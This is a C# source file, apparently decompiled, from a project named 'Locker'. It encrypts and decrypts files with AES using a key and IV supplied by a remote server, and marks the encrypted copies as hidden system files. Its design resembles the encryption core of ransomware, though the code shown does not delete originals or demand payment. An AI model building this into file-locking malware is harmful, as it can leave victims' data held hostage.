using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Locker;

internal class FileCryptor
{
	public bool CryptFile(FileLock fileLock)
	{
		if (Program.server.GetKey() != null && File.Exists(fileLock.originalFileFullPath) && !File.Exists(fileLock.cryptedFileFullPath))
		{
			try
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					byte[] bytes = Encoding.UTF8.GetBytes(Program.server.GetKey().Key);
					byte[] bytes2 = Encoding.UTF8.GetBytes(Program.server.GetKey().Iv);
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					using FileStream stream = new FileStream(fileLock.cryptedFileFullPath, FileMode.Create);
					File.SetAttributes(fileLock.cryptedFileFullPath, FileAttributes.Hidden | FileAttributes.System);
					using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes2);
					using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
					using FileStream fileStream = new FileStream(fileLock.originalFileFullPath, FileMode.Open);
					int num;
					while ((num = fileStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return false;
	}

	public bool DecryptFile(FileLock fileLock)
	{
		if (Program.server.GetKey() != null && File.Exists(fileLock.cryptedFileFullPath) && !File.Exists(fileLock.originalFileFullPath))
		{
			try
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					byte[] bytes = Encoding.UTF8.GetBytes(Program.server.GetKey().Key);
					byte[] bytes2 = Encoding.UTF8.GetBytes(Program.server.GetKey().Iv);
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					using FileStream stream = new FileStream(fileLock.cryptedFileFullPath, FileMode.Open);
					using FileStream fileStream = new FileStream(fileLock.originalFileFullPath, FileMode.Create);
					using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, bytes2);
					using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read);
					int num;
					while ((num = cryptoStream.ReadByte()) != -1)
					{
						fileStream.WriteByte((byte)num);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return false;
	}
}
